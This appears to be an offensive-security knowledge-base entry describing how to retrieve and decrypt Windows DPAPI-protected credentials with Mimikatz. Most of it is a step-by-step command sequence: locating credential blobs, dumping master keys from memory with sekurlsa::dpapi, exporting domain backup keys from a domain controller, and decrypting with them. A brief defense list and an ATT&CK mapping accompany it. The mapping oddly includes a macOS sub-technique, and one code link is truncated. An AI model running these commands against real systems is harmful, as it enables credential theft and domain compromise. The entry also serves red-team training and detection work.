---
id: fb268a4e-43e5-44f3-813e-6b78b9390a36
name: Windows DPAPI Credential Retrieval with Mimikatz
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.286509+00:00'
updated_at: '2023-04-10T20:37:13.281844+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credentials from Password Stores|T1555 - Credentials from Password Stores]]'
sub_techniques:
- '[[Credentials from Web Browsers|T1555.003 - Credentials from Web Browsers]]'
- '[[Securityd Memory|T1555.002 - Securityd Memory]]'
tags:
- '[[Data Protection API]]'
- '[[Mimikatz - Credential Manager & DPAPI]]'
- '[[Windows - DPAPI]]'
commands:
- '[[Check Credentials Folder]]'
- '[[Export Backup Keys]]'
- '[[Find Master Key]]'
- '[[Use Backup Keys to Decrypt Credentials]]'
- '[[Use Master Key to Decrypt Credentials]]'
- '[[Use Mimikatz to Decrypt Credentials]]'
---

# Windows DPAPI Credential Retrieval with Mimikatz

## Summary

This procedure involves using Mimikatz to retrieve and decrypt Windows credentials that are protected using the Data Protection API (DPAPI). DPAPI is a Windows API that provides protection for sensitive data, such as passwords, by encrypting it with a key derived from the user's credentials. Mimika

## Description

# Description

This procedure involves using Mimikatz to retrieve and decrypt Windows credentials that are protected using the Data Protection API (DPAPI). DPAPI is a Windows API that provides protection for sensitive data, such as passwords, by encrypting it with a key derived from the user's credentials. Mimikatz is a tool that can be used to extract these credentials from memory, and then decrypt them using the appropriate DPAPI key. This technique can be used by an attacker to gain access to sensitive information, such as usernames and passwords, that are stored on a Windows system.

## Requirements

1. Access to a Windows system

1. Privileged access to run Mimikatz

1. Knowledge of the DPAPI key used to protect the credentials

## Defense

1. Ensure that the DPAPI key is properly protected and not accessible to unauthorized users

1. Monitor for suspicious activity, such as the use of Mimikatz, on Windows systems

1. Implement strong password policies and multi-factor authentication to reduce the impact of credential theft

## Objectives

1. Retrieve Windows credentials from a target system

1. Decrypt DPAPI-protected credentials using Mimikatz

# Instructions

1. To retrieve and decrypt Windows credentials, follow these steps:
1. Check the folder to find the credentials by running the command:
   dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*
2. Check the file with mimikatz by running the command:
   mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
3. Find the master key by running the command:
   mimikatz !sekurlsa::dpapi
4. Use the master key by running the command:
   mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
5. Find and export backup keys by running the command:
   lsadump::backupkeys /system:dc01.lab.local /export
6. Use the backup keys by running the command:
   dpapi::masterkey /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk

**Code**: [[# check the folder to find credentials
dir C:\User]]

> This command can be used to retrieve and decrypt Windows credentials. The command utilizes a number of tools, including mimikatz and lsadump, to find and decrypt the credentials. The instructions provided explain how to use the command to retrieve and decrypt the credentials step-by-step. It is important to note that this command should only be used for authorized purposes and with appropriate permissions.

**Command** ([[Check Credentials Folder]]):

```bash
dir C:\Users\<username>\AppData\Local\Microsoft\Credentials\*
```

**Command** ([[Use Mimikatz to Decrypt Credentials]]):

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
```

**Command** ([[Find Master Key]]):

```bash
mimikatz !sekurlsa::dpapi
```

**Command** ([[Use Master Key to Decrypt Credentials]]):

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```

**Command** ([[Export Backup Keys]]):

```bash
lsadump::backupkeys /system:dc01.lab.local /export
```

**Command** ([[Use Backup Keys to Decrypt Credentials]]):

```bash
dpapi::masterkey /in:"C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Protect\S-1-5-21-2552734371-813931464-1050690807-1106\3e90dd9e-f901-40a1-b691-84d7f647b8fe" /pvk:ntds_capi_0_d2685b31-402d-493b-8d12-5fe48ee26f5a.pvk
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credentials from Password Stores|T1555 - Credentials from Password Stores]]

### Sub-Techniques

- [[Credentials from Web Browsers|T1555.003 - Credentials from Web Browsers]]
- [[Securityd Memory|T1555.002 - Securityd Memory]]

## Commands Used

- [[Check Credentials Folder]]
- [[Export Backup Keys]]
- [[Find Master Key]]
- [[Use Backup Keys to Decrypt Credentials]]
- [[Use Master Key to Decrypt Credentials]]
- [[Use Mimikatz to Decrypt Credentials]]

## Tags

- [[Data Protection API]]
- [[Mimikatz - Credential Manager & DPAPI]]
- [[Windows - DPAPI]]
